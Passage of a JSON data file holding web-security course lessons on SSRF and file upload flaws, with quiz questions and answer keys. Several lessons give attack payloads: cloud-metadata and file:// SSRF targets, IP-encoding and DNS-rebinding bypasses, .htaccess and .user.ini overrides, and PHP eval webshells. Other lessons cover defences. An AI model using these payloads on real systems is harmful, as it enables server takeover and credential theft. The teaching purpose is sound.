rejected."}]},
  "web-05-03": {"html":"\n<h2>SSRF Fundamentals, Internal Recon & Cloud Metadata Exploitation</h2>\n\n<p><strong>Server-Side Request Forgery (SSRF)</strong> has become one of the most critical threats in cloud-native and microservice architectures. Attackers coerce the <strong>backend server itself into initiating unauthorized requests</strong> toward internal network services, loopback interfaces, or cloud provider metadata endpoints!</p>\n\n<p>Consider an intuitive analogy: An enterprise office restricts physical access from the outside. However, the front desk receptionist has an automated document scanner that accepts web URLs and prints out the contents. An adversary visits the website and submits an internal payroll URL: <code>http://192.168.1.50/payroll.xlsx</code>. Because the receptionist is physically inside the corporate network, the scanner fetches the confidential document and prints it straight to the attacker. That is SSRF!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the core vulnerability mechanics: exploiting the server's privileged network position<br>\n  ② Identify common application entry points (avatar uploads, webhooks, URL previewers)<br>\n  ③ Probe public cloud <strong>Instance Metadata Services (IMDS at 169.254.169.254)</strong> to compromise IAM credentials<br>\n  ④ Master the SSRF protocol reference matrix (<code>http://</code>, <code>file://</code>, <code>gopher://</code>, <code>dict://</code>)</p>\n</div>\n\n<h3>Step 1: SSRF Protocol & Target Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Attack Vector</th><th>Target URI / Scheme</th><th>Impact & Blast Radius</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Cloud Metadata Theft</strong></td>\n      <td><code>http://169.254.169.254/latest/meta-data/</code></td>\n      <td><strong>Critical</strong>: Exfiltrates temporary STS/IAM access tokens from AWS/GCP/Alibaba Cloud to seize tenant control</td>\n    </tr>\n    <tr>\n      <td><strong>Arbitrary File Read</strong></td>\n      <td><code>file:///etc/passwd</code> or <code>file:///c:/windows/win.ini</code></td>\n      <td>Dumps underlying system configuration, source files, and password hashes</td>\n    </tr>\n    <tr>\n      <td><strong>Internal Port Scanning</strong></td>\n      <td><code>http://127.0.0.1:6379</code>, <code>http://10.0.0.1:8080</code></td>\n      <td>Maps internal network topology and identifies unauthenticated internal services (Redis, Elasticsearch)</td>\n    </tr>\n    <tr>\n      <td><strong>Gopher Protocol Injection</strong></td>\n      <td><code>gopher://127.0.0.1:6379/_*3%0d%0a...</code></td>\n      <td>Sends arbitrary raw TCP payloads to trigger remote code execution against internal databases</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Minimal Vulnerable SSRF Code Snippet</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\"># ❌ Insecure: Direct server fetch without destination validation\nimport requests\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/preview')\ndef preview_image():\n    target_url = request.args.get('url')\n    # Server initiates outbound connection blindly!\n    res = requests.get(target_url, timeout=3)\n    return res.content</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Key Distinction:</strong> CSRF forces the victim's browser to make requests. SSRF forces the vulnerable backend server to act as an unauthenticated proxy.<br>\n  ② <strong>High Value Targets:</strong> The link-local metadata address <code>169.254.169.254</code> is the prime target in modern cloud compromise chains.</p>\n</div>\n","checkpoints":[{"question":"In major cloud providers (AWS, GCP, Alibaba Cloud), what is the default IP of the Instance Metadata Service (IMDS)?","options":["127.0.0.1","192.168.1.1","169.254.169.254","10.0.0.1"],"answer":2,"explanation":"169.254.169.254 is the standard link-local address providing instance metadata and temporary IAM access tokens."},{"question":"What is the primary architectural difference between CSRF and SSRF?","options":["CSRF is dispatched by the server, while SSRF is dispatched by the browser","CSRF is dispatched by the victim's client browser, whereas SSRF is dispatched by the backend application server","There is no difference between them","SSRF is restricted solely to mobile devices"],"answer":1,"explanation":"CSRF forces the client browser to make requests with ambient credentials; SSRF forces the backend server to make outbound network requests."}]},
  "web-05-04": {"html":"\n<h2>SSRF Bypass Techniques: DNS Rebinding & IP Encodings</h2>\n\n<p>When defending against SSRF, many teams implement rudimentary blacklists: stripping strings matching <code>127.0.0.1</code>, <code>localhost</code>, or <code>192.168.</code>. However, the TCP/IP stack parses numerical representations across multiple bases, and advanced time-of-check to time-of-use (TOCTOU) flaws like <strong>DNS Rebinding</strong> can completely subvert naive domain filters.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Master alternate IP representations (Decimal, Hexadecimal, Octal, and Dword notations)<br>\n  ② Exploit zero-address resolution and IPv6 loopback variants (<code>0.0.0.0</code>, <code>[::1]</code>)<br>\n  ③ Leverage HTTP 302 Redirection to bypass application-level protocol inspectors<br>\n  ④ Understand the mechanics of <strong>DNS Rebinding</strong> against split resolve-then-fetch architectures</p>\n</div>\n\n<h3>Step 1: IP Obfuscation Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Obfuscation Scheme</th><th>Payload Example</th><th>Underlying Resolution Mechanics</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>Dword / Decimal IP</strong></td>\n      <td><code>http://2130706433</code></td>\n      <td>Calculated as (127 &times; 256<sup>3</sup>) + 1 = 2130706433; standard POSIX sockets convert directly to 127.0.0.1</td>\n    </tr>\n    <tr>\n      <td><strong>Hexadecimal Notation</strong></td>\n      <td><code>http://0x7f000001</code></td>\n      <td>Base-16 integer format bypassing regex designed for dotted-decimal patterns</td>\n    </tr>\n    <tr>\n      <td><strong>Octal Notation</strong></td>\n      <td><code>http://0177.0000.0000.0001</code></td>\n      <td>Leading zero prefixes trigger octal interpretation via <code>inet_aton()</code></td>\n    </tr>\n    <tr>\n      <td><strong>Class A/B Ellipsis</strong></td>\n      <td><code>http://127.1</code></td>\n      <td>Omitted octets are zero-padded automatically to 127.0.0.1</td>\n    </tr>\n    <tr>\n      <td><strong>Unspecified IPv4 / IPv6</strong></td>\n      <td><code>http://0.0.0.0</code> or <code>http://[::1]</code></td>\n      <td>In Linux environments, <code>0.0.0.0</code> routes directly to all bound local services</td>\n    </tr>\n    <tr>\n      <td><strong>Public DNS Wildcards</strong></td>\n      <td><code>http://127.0.0.1.nip.io</code></td>\n      <td>Resolves directly to loopback via authoritative external DNS entries</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: DNS Rebinding Mechanics (Defeating TOCTOU)</h3>\n\n<p>Consider a vulnerable validation pattern:</p>\n<ol>\n  <li><strong>Check Phase:</strong> The backend resolves <code>attacker.com</code>. If the resolved IP is public, validation passes.</li>\n  <li><strong>Fetch Phase:</strong> The backend executes <code>fetch(\"http://attacker.com\")</code>.</li>\n</ol>\n\n<p>The adversary deploys a custom authoritative DNS server for <code>rebind.evil.com</code> configured with <strong>TTL = 0 seconds</strong>:</p>\n<ul>\n  <li>Query 1 (Check Phase) returns public IP <code>1.2.3.4</code> &rarr; Validation passes!</li>\n  <li>Query 2 (Fetch Phase, milliseconds later) expires cache and returns <code>127.0.0.1</code> &rarr; Target server fetches internal resources directly!</li>\n</ul>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Never Rely on Hostname/IP Blacklists:</strong> IP format flexibility breaks all string-matching rules.<br>\n  ② <strong>Prevent DNS Rebinding:</strong> Pin the resolved IP address immediately upon DNS lookup and dispatch the HTTP request directly to that pinned IP, supplying the original hostname solely in the HTTP <code>Host</code> header.</p>\n</div>\n","checkpoints":[{"question":"What is the primary prerequisite that allows DNS Rebinding to bypass IP validation checks?","options":["The attacker has compromised the root DNS servers","The server resolves the hostname during validation and resolves it again during fetch, while the attacker returns TTL=0 with changing IPs","The target server has host antivirus software installed","The attacker possesses the server's SSH key"],"answer":1,"explanation":"A Time-of-Check to Time-of-Use (TOCTOU) gap permits returning a benign public IP on check, followed by an internal target IP upon fetch."},{"question":"Which of the following alternate representations evaluates directly to loopback address 127.0.0.1?","options":["http://2130706433","http://0x7f000001","http://127.1","All of the above"],"answer":3,"explanation":"Decimal dword 2130706433, hexadecimal 0x7f000001, and shorthand 127.1 are all valid representations of 127.0.0.1."}]},
  "web-05-05": {"html":"\n<h2>Ultimate SSRF Defense: Network Isolation & Strict Allowlists</h2>\n\n<p>As established in earlier lessons, attempting to sanitize URLs purely via regular expressions in application code is an architectural anti-pattern. Bulletproof SSRF mitigation mandates a <strong>Defense-in-Depth posture: protocol & domain allowlists, network-level egress segregation (DMZ), and DNS resolution pinning</strong>.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Enforce strict <strong>Scheme and Host allowlists</strong> over blacklists<br>\n  ② Implement egress filtering via <strong>VPC Security Groups, Network ACLs, and IPTables</strong> to isolate internal subnets<br>\n  ③ Secure cloud environments by migrating strictly to <strong>IMDSv2 (Session-Token-Enforced Metadata)</strong><br>\n  ④ Author production-grade DNS-pinned request wrappers that mathematically eliminate DNS Rebinding</p>\n</div>\n\n<h3>Step 1: 5-Tier Defense-in-Depth Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Defense Tier</th><th>Control Mechanism</th><th>Technical Implementation</th><th>Threat Neutralized</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>1. Protocol Allowlists</strong></td>\n      <td>Restrict strictly to HTTP / HTTPS</td>\n      <td>Filter out <code>file://</code>, <code>gopher://</code>, <code>dict://</code>, <code>ftp://</code></td>\n      <td>Prevents local file reads and raw socket payloads</td>\n    </tr>\n    <tr>\n      <td><strong>2. Domain Allowlists</strong></td>\n      <td>Pre-approved host whitelist</td>\n      <td>Validate destination against a rigid array of trusted business partners</td>\n      <td>Eliminates outbound access to unvetted external and internal networks</td>\n    </tr>\n    <tr>\n      <td><strong>3. Network Isolation</strong></td>\n      <td>DMZ & Egress Firewall rules</td>\n      <td>Deploy URL fetching daemons inside isolated subnets with zero routes to RFC 1918 private spaces</td>\n      <td>Guarantees that even if code is bypassed, network routers drop internal traffic</td>\n    </tr>\n    <tr>\n      <td><strong>4. Cloud Hardening</strong></td>\n      <td>Enforce IMDSv2</td>\n      <td>Require <code>X-aws-ec2-metadata-token</code> headers for metadata retrieval</td>\n      <td>Neutralizes metadata exfiltration because SSRF cannot inject custom headers</td>\n    </tr>\n    <tr>\n      <td><strong>5. Disable Redirects</strong></td>\n      <td>Zero follow 30x responses</td>\n      <td>Set <code>allow_redirects=False</code></td>\n      <td>Prevents external sites from bouncing requests into internal IP ranges</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Production Safe-Fetch Implementation (DNS Pinning in Python)</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\">import ipaddress\nimport socket\nimport requests\n\ndef safe_fetch(hostname, path):\n    # Step 1: Resolve hostname explicitly\n    ip_str = socket.gethostbyname(hostname)\n    ip_obj = ipaddress.ip_address(ip_str)\n\n    # Step 2: Validate against private, loopback, and link-local (169.254) networks\n    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:\n        raise ValueError(f\"Target address {ip_str} rejected by egress security policy\")\n\n    # Step 3: Dispatch request directly to validated IP without triggering second DNS lookup\n    dest_url = f\"http://{ip_str}{path}\"\n    headers = {\"Host\": hostname}\n    return requests.get(dest_url, headers=headers, allow_redirects=False, timeout=3)</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① Security must be enforced in the network fabric: isolate fetching workers in a dedicated DMZ.<br>\n  ② On public clouds, mandate <strong>IMDSv2</strong> and constrain token hop limits to 1 to permanently secure infrastructure identity credentials.</p>\n</div>\n","checkpoints":[{"question":"What is the most effective code-level defense pattern against DNS Rebinding attacks?","options":["Inserting an artificial 5-second sleep before each fetch","Resolving the IP, validating it, and dispatching the HTTP request directly to that pinned IP with the original Host header","Downgrading the host to Windows XP","Randomizing outgoing port numbers"],"answer":1,"explanation":"DNS Pinning dispatches traffic directly to the already validated IP address, eliminating the second DNS resolution step."},{"question":"Why does mandating IMDSv2 on AWS mitigate SSRF metadata theft?","options":["IMDSv2 completely disables outgoing public internet access","IMDSv2 requires a prior PUT request to obtain a session token and mandates custom headers on subsequent GET calls","IMDSv2 deletes all IAM roles assigned to instances","IMDSv2 requires physical hardware key insertion"],"answer":1,"explanation":"IMDSv2 mandates an X-aws-ec2-metadata-token header obtained via PUT, which typical SSRF primitives cannot synthesize."}]},
  "web-06-01": {"html":"\n<h2>File Upload Fundamentals: Client-Side Bypasses & MIME Spoofing</h2>\n\n<p><strong>Unrestricted File Upload vulnerabilities</strong> remain one of the most devastating attack primitives in web security, offering adversaries the shortest path toward <strong>Remote Code Execution (RCE) and full server takeover (GetShell)</strong>. If an application permits users to store files on the server filesystem without rigorous extension and content validation, an attacker can upload executable script artifacts (e.g. <code>shell.php</code>, <code>shell.jsp</code>, <code>shell.asp</code>) and trigger them directly via HTTP.</p>\n\n<p>Consider an intuitive analogy: A train station checkpoint specifies that passengers may only carry bottled water. A passenger brings water. However, if the inspector relies strictly on the printed paper label around the bottle (equivalent to client-side JS or the HTTP <code>Content-Type</code> header), an adversary can fill the bottle with liquid explosives and slap a commercial water brand label on it. The inspector waves it through, storing explosives in the VIP lounge until detonation!</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Understand the core vulnerability: web servers (Apache, Nginx, IIS) parsing uploaded files as executable server-side scripts<br>\n  ② Neutralize client-side JavaScript extension checks via HTTP interception and DOM tampering<br>\n  ③ Spoof HTTP multipart <code>Content-Type / MIME</code> boundaries<br>\n  ④ Reference canonical MIME headers across target extensions (PNG, JPG, GIF, PDF, ZIP)</p>\n</div>\n\n<h3>Step 1: File Extensions vs. Canonical MIME Cheat Sheet</h3>\n\n<p>Many junior developers inspect only the client-supplied <code>$_FILES['file']['type']</code> property. However, <strong><code>Content-Type</code> is generated by the user's browser during multipart encoding and can be modified arbitrarily inside a proxy!</strong></p>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Target File Format</th><th>Standard Extensions</th><th>Canonical Content-Type / MIME Header</th><th>Attacker Bypass Vector</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>JPEG Image</strong></td>\n      <td><code>.jpg</code> / <code>.jpeg</code></td>\n      <td><code>image/jpeg</code></td>\n      <td>Change <code>shell.php</code> Content-Type to <code>image/jpeg</code></td>\n    </tr>\n    <tr>\n      <td><strong>PNG Image</strong></td>\n      <td><code>.png</code></td>\n      <td><code>image/png</code></td>\n      <td>Replace <code>application/x-php</code> with <code>image/png</code></td>\n    </tr>\n    <tr>\n      <td><strong>GIF Image</strong></td>\n      <td><code>.gif</code></td>\n      <td><code>image/gif</code></td>\n      <td>Set <code>image/gif</code> and prepend magic bytes <code>GIF89a</code></td>\n    </tr>\n    <tr>\n      <td><strong>PDF Document</strong></td>\n      <td><code>.pdf</code></td>\n      <td><code>application/pdf</code></td>\n      <td>Bypass document checks with <code>application/pdf</code></td>\n    </tr>\n    <tr>\n      <td><strong>ZIP Archive</strong></td>\n      <td><code>.zip</code></td>\n      <td><code>application/zip</code></td>\n      <td>Spoof compressed archive MIME types</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Defeating Client-Side JavaScript Filtering</h3>\n\n<p>When forms rely strictly on client-side constraints:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-html\">&lt;!-- ❌ Insecure: Pure client-side validation --&gt;\n&lt;input type=\"file\" id=\"upload\" accept=\".jpg,.png\" onchange=\"validateFile()\" /&gt;</code></pre>\n</div>\n\n<p><strong>Bypass Strategies:</strong></p>\n<ol>\n  <li><strong>Proxy Interception:</strong> Rename <code>shell.php</code> to <code>shell.jpg</code> on disk, select it in the browser, intercept the outbound POST request in Burp Suite, and rename the parameter back to <code>filename=\"shell.php\"</code> before relaying.</li>\n  <li><strong>DOM Event Removal:</strong> Open the browser console (F12) and run <code>document.getElementById(\"upload\").onchange = null;</code> to unbind the client validation listener entirely.</li>\n</ol>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Never Trust Client Checks:</strong> Client-side file extension and size restrictions serve purely as UX helpers, not security boundaries.<br>\n  ② <strong>MIME Headers Are Untrusted:</strong> The <code>Content-Type</code> header is fully user-controlled data that must be corroborated through deep content inspection on the server.</p>\n</div>\n","checkpoints":[{"question":"In application security architecture, pure client-side JavaScript file validation serves as:","options":["A bulletproof security boundary","A user-experience convenience helper that can be completely bypassed by intercepting HTTP requests","A core defense against DDoS floods","A database indexing optimizer"],"answer":1,"explanation":"Client-side code executes in an attacker-controlled environment; modifying the request in a proxy invalidates client constraints."},{"question":"Why is relying solely on the HTTP Content-Type header to validate file uploads insecure?","options":["It causes hardware network interface card failures","Content-Type is supplied by the untrusted client and can be freely spoofed to benign types like image/png","Content-Type is only recognized on Linux distributions","Content-Type automatically exposes session tokens"],"answer":1,"explanation":"The Content-Type multipart header is generated client-side and can be trivially forged in an interception proxy."}]},
  "web-06-02": {"html":"\n<h2>File Upload Blacklist Bypasses & Config Exploits (.htaccess / .user.ini)</h2>\n\n<p>When developers realize client-side filtering is inadequate, they typically implement backend blacklists to block known dangerous extensions (e.g. <code>.php</code>, <code>.jsp</code>, <code>.asp</code>). However, blacklist defenses frequently collapse against alternative extension aliases, operating system filename normalization quirks, and server configuration overrides.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Reference canonical <strong>executable extension aliases</strong> across PHP, ASP, and Java runtimes<br>\n  ② Leverage Windows OS normalization artifacts: trailing spaces, trailing dots, and NTFS <code>::$DATA</code> streams<br>\n  ③ Force arbitrary file execution via Apache <strong><code>.htaccess</code> directive overrides</strong><br>\n  ④ Deploy persistent webshell execution via Nginx / PHP-FPM <strong><code>.user.ini</code> auto-prepends</strong></p>\n</div>\n\n<h3>Step 1: Script Extension Aliases Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Runtime Environment</th><th>Default Blacklisted Extensions</th><th>Viable Alternative Extension Aliases</th><th>Execution Prerequisite</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>PHP Runtimes</strong></td>\n      <td><code>.php</code></td>\n      <td>\n        <code>.php3</code>, <code>.php4</code>, <code>.php5</code>, <code>.phtml</code><br>\n        <code>.phps</code>, <code>.pht</code>\n      </td>\n      <td>Server configuration binds the alias to the FastCGI / PHP interpreter module</td>\n    </tr>\n    <tr>\n      <td><strong>ASP / .NET</strong></td>\n      <td><code>.asp</code>, <code>.aspx</code></td>\n      <td><code>.asa</code>, <code>.cer</code>, <code>.cdx</code>, <code>.ashx</code>, <code>.asmx</code></td>\n      <td>IIS maps legacy script handler mappings to executable ASP engines</td>\n    </tr>\n    <tr>\n      <td><strong>Java / JSP</strong></td>\n      <td><code>.jsp</code></td>\n      <td><code>.jspx</code>, <code>.jsw</code>, <code>.jsv</code>, <code>.jspf</code></td>\n      <td>Servlet container supports XML-compliant JSP document parsing</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Windows Filesystem Normalization Quirks</h3>\n\n<p>The Windows NT filesystem (NTFS) strips certain trailing characters when committing filenames to disk:</p>\n<ul>\n  <li><strong>Trailing Dots (<code>.</code>):</strong> Uploading <code>shell.php.</code> bypasses string comparison for <code>.php</code>, while Windows strips the trailing dot upon disk commit, yielding <code>shell.php</code>.</li>\n  <li><strong>Trailing Spaces (<code> </code>):</strong> Uploading <code>shell.php </code> strips the whitespace on disk write.</li>\n  <li><strong>NTFS Alternate Data Streams (<code>::$DATA</code>):</strong> Uploading <code>shell.php::$DATA</code> signals the primary data stream, storing the payload into <code>shell.php</code> while defeating extension regexes.</li>\n</ul>\n\n<h3>Step 3: Server Configuration File Overrides</h3>\n\n<h4>① Apache Directive Overrides via <code>.htaccess</code></h4>\n<p>If Apache allows directory-level overrides (<code>AllowOverride All</code>), upload an <code>.htaccess</code> file:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-apache\"># Forces Apache to execute all .png files as PHP scripts!\nAddType application/x-httpd-php .png</code></pre>\n</div>\n<p>Then upload <code>photo.png</code> containing <code>&lt;?php @eval($_POST['pass']); ?&gt;</code>. Navigating to <code>photo.png</code> executes PHP immediately!</p>\n\n<h4>② PHP-FPM Configuration Injection via <code>.user.ini</code></h4>\n<p>On modern PHP setups (PHP 5.3+), uploading a <code>.user.ini</code> file instructs the engine to auto-include a payload before every script invocation:</p>\n<div class=\"code-block\">\n<pre><code class=\"language-ini\">; Automatically prepends photo.png to any PHP script executing in this directory\nauto_prepend_file = photo.png</code></pre>\n</div>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Blacklists Are Inherently Defective:</strong> Obscure extensions (<code>.phtml</code>), case variations (<code>.pHP</code>), and OS quirks consistently undermine negative filtering.<br>\n  ② <strong>Protect Server Configs:</strong> Applications must strictly forbid files starting with a leading period (<code>.htaccess</code>, <code>.user.ini</code>).</p>\n</div>\n","checkpoints":[{"question":"In an Apache environment with AllowOverride enabled, which configuration file can an attacker upload to force images to execute as PHP?","options":["web.config",".htaccess","nginx.conf","my.ini"],"answer":1,"explanation":".htaccess allows directory-level directives like AddType application/x-httpd-php .png, executing image files as PHP."},{"question":"Under Windows OS, appending which trailing characters bypasses naive extension blacklists while normalizing back to executable extensions upon disk write?","options":["A trailing dot or space (e.g. shell.php.)","A trailing Chinese character","A trailing underscore","A random alphanumeric string"],"answer":0,"explanation":"The Windows NT filesystem automatically strips trailing periods and whitespace upon committing the file to disk."}]},
  "web-06-03": {"html":"\n<h2>Webshell Polyglots, Image Re-rendering & Race Conditions</h2>\n\n<p>In mature enterprise architectures, backends validate uploaded assets using image processing libraries (e.g. PHP's <code>getimagesize()</code> or GD/ImageMagick). Overcoming deep content inspection demands mastery over <strong>Webshell Polyglots, re-rendering survival techniques, and Race Conditions</strong>.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Synthesize valid binary image polyglots via binary concatenation (<code>copy /b</code>)<br>\n  ② Reference canonical file header signatures (<strong>Magic Bytes</strong>) across formats<br>\n  ③ Overcome image re-rendering routines (e.g. <code>imagecopyresampled</code>)<br>\n  ④ Exploit <strong>Race Conditions</strong> arising from insecure save-then-validate processing pipelines</p>\n</div>\n\n<h3>Step 1: Image Polyglot Synthesis & Magic Bytes</h3>\n\n<p>An image webshell embeds executable code inside a valid image structure, satisfying dimension, palette, and checksum checks:</p>\n\n<div class=\"code-block\">\n<pre><code class=\"language-bash\"># Windows binary append\ncopy /b innocent.gif + shell.php evil.gif\n\n# Linux / macOS shell concatenation\ncat innocent.png shell.php &gt; evil.png</code></pre>\n</div>\n\n<h3>Step 2: Canonical Magic Bytes Reference Cheat Sheet</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>File Format</th><th>Hexadecimal Magic Bytes Signature</th><th>ASCII Representation</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>GIF89a</strong></td>\n      <td><code>47 49 46 38 39 61</code></td>\n      <td><code>GIF89a</code></td>\n    </tr>\n    <tr>\n      <td><strong>PNG</strong></td>\n      <td><code>89 50 4E 47 0D 0A 1A 0A</code></td>\n      <td><code>.PNG....</code></td>\n    </tr>\n    <tr>\n      <td><strong>JPEG</strong></td>\n      <td><code>FF D8 FF E0</code></td>\n      <td><code>&yuml;&Oslash;&yuml;...</code></td>\n    </tr>\n    <tr>\n      <td><strong>ZIP / JAR / DOCX</strong></td>\n      <td><code>50 4B 03 04</code></td>\n      <td><code>PK..</code></td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 3: Exploiting Save-Then-Validate Race Conditions</h3>\n\n<p>Consider a vulnerable backend workflow:</p>\n<ol>\n  <li><strong>Step 1:</strong> Save incoming file directly into public directory: <code>/uploads/shell.php</code>.</li>\n  <li><strong>Step 2:</strong> Scan file content against malware rules or extension constraints.</li>\n  <li><strong>Step 3:</strong> If invalid, invoke <code>unlink()</code> to delete the file.</li>\n</ol>\n\n<p><strong>Race Condition Exploitation:</strong></p>\n<p>Between Step 1 and Step 3 lies a execution window of several milliseconds. An attacker dispatches concurrent asynchronous threads:</p>\n<ul>\n  <li><strong>Thread Worker A:</strong> Continually uploads <code>shell.php</code> containing: <code>file_put_contents('backdoor.php', '&lt;?php @eval($_POST[1]);?&gt;')</code>.</li>\n  <li><strong>Thread Worker B:</strong> Concurrently hammers <code>GET /uploads/shell.php</code> with hundreds of requests per second.</li>\n</ul>\n<p>The instant one request lands within the millisecond window before deletion, <code>shell.php</code> executes and drops permanent unmonitored artifact <code>backdoor.php</code>!</p>\n\n<div class=\"callout warning\">\n  <div class=\"callout-title\">Exercises & Chapter Summary</div>\n  <p><strong>Chapter Summary:</strong><br>\n  ① <strong>Re-rendering Mitigation:</strong> Advanced polyglots position payloads inside immutable IDAT/compression chunks untouched by the renderer.<br>\n  ② <strong>Eliminate Race Windows:</strong> Upload to sandboxed temporary staging folders outside the webroot; move files only after complete validation passes.</p>\n</div>\n","checkpoints":[{"question":"What architectural flaw gives rise to File Upload Race Condition vulnerabilities?","options":["Low CPU clock speeds on host machines","Saving untrusted files into web-accessible directories before executing validation and conditional deletion","Packet loss caused by network congestion","Database transaction deadlocks"],"answer":1,"explanation":"A time window between writing the file to disk and deleting it upon validation failure enables concurrent HTTP requests to trigger the payload."},{"question":"What is the defining characteristic of a Webshell Polyglot image?","options":["Renaming a plaintext script to .jpg","Maintaining valid image format headers and structures while housing executable code in inert chunks","Having a file size exceeding 100MB","Being encrypted with a private key"],"answer":1,"explanation":"Polyglots retain valid image magic bytes and metadata to pass parser checks while executing scripts when processed by an interpreter."}]},
  "web-06-04": {"html":"\n<h2>Ultimate File Upload Defense: Isolation, Renaming & Execution Stripping</h2>\n\n<p>The severity of file upload vulnerabilities reaches catastrophic proportions because uploaded scripts are parsed by web application servers as **executable programs**. If uploaded assets are strictly treated as inert data and execution rights are physically severed, file upload exploits lose their entire blast radius. Securing file uploads requires building a **four-layer defense-in-depth posture**.</p>\n\n<div class=\"callout info\">\n  <div class=\"callout-title\">What You Will Learn</div>\n  <p>① Replace all blacklists with rigorous <strong>Strict Allowlist (Whitelist) validation</strong><br>\n  ② Implement <strong>Server-Side Cryptographic Renaming (UUIDs)</strong> to neutralize directory traversal and predictability<br>\n  ③ Strip server-side execution permissions in Nginx and Apache for all upload directories<br>\n  ④ Deploy the modern cloud standard: <strong>Object Storage (AWS S3 / OSS) + Sandboxed CDN Domains</strong></p>\n</div>\n\n<h3>Step 1: 4-Tier Enterprise Defense Matrix</h3>\n\n<table class=\"summary-table\">\n  <thead>\n    <tr><th>Defense Layer</th><th>Core Strategy</th><th>Technical Implementation</th><th>Threat Neutralized</th></tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><strong>1. Strict Extension Allowlist</strong></td>\n      <td>Allow only vetted extensions</td>\n      <td>Only permit <code>.jpg</code>, <code>.png</code>, <code>.pdf</code>; extract suffix after final period and lowercase</td>\n      <td>Blocks all alternative executable aliases (<code>.phtml</code>, <code>.jspx</code>, <code>.php5</code>)</td>\n    </tr>\n    <tr>\n      <td><strong>2. Forced Random Renaming</strong></td>\n      <td>Destroy original filename</td>\n      <td>Generate filename via <code>uuid4().hex + .jpg</code></td>\n      <td>Defeats directory traversal (<code>../../shell.php</code>) and persistent webshell bookmarks</td>\n    </tr>\n    <tr>\n      <td><strong>3. Strip Execution Permissions</strong></td>\n      <td>Disable web server script engines</td>\n      <td>Configure Nginx: <code>location ~ /uploads/.*\\.(php|phtml)$ { deny all; }</code></td>\n      <td>Even if a script file lands on disk, the web server refuses execution and serves 403 Forbidden</td>\n    </tr>\n    <tr>\n      <td><strong>4. Object Storage Separation</strong></td>\n      <td>Offload to S3/OSS</td>\n      <td>Store assets in dedicated buckets accessed via sandboxed cookie-less CDN domains</td>\n      <td><strong>Ultimate Architectural Defense</strong>: Files never touch application server storage; zero risk of RCE</td>\n    </tr>\n  </tbody>\n</table>\n\n<h3>Step 2: Nginx Execution Permission Stripping Template</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-nginx\"># Hardened Nginx upload directory policy\nserver {\n    listen 80;\n    server_name example.com;\n    root /var/www/html;\n\n    # Permanently blocks script execution inside uploads path\n    location ~* ^/uploads/.*\\.(php|php5|phtml|sh|py|pl|cgi)$ {\n        deny all;\n        return 403;\n    }\n}</code></pre>\n</div>\n\n<h3>Step 3: Hardened Server-Side Upload Routine (Python)</h3>\n\n<div class=\"code-block\">\n<pre><code class=\"language-python\">import os\nimport uuid\nimport magic\n\nALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}\nALLOWED_MIMES = {'image/png', 'image/jpeg', 'image/gif'}\n\ndef secure_upload(file_obj, upload_dir):\n    # Step 1: Strict extension extraction\n    ext = file_obj.filename.rsplit('.', 1)[-1].lower()\n    if ext not in ALLOWED_EXTENSIONS:\n        raise ValueError(\"Invalid extension rejected by security allowlist\")\n\n    # Step 2: Deep magic byte verification via libmagic\n    sample_bytes = file_obj.stream.read(2048)\n    file_obj.stream.seek(0)\n    detected_mime = magic.from_buffer(sample_bytes, mime=True)\n    if detected_mime not in ALLOWED_MIMES:\n        raise ValueError(f\"Dangerous file payload detected: {detected_mime}\")\n\n    # Step 3: Obliterate original user filename\n    safe_name = f\"{uuid.uuid4().hex}.{ext}\"\n    dest_path = os.path.join(upload_dir, safe_name)\n\n    file_obj.save(dest_path)\n    return 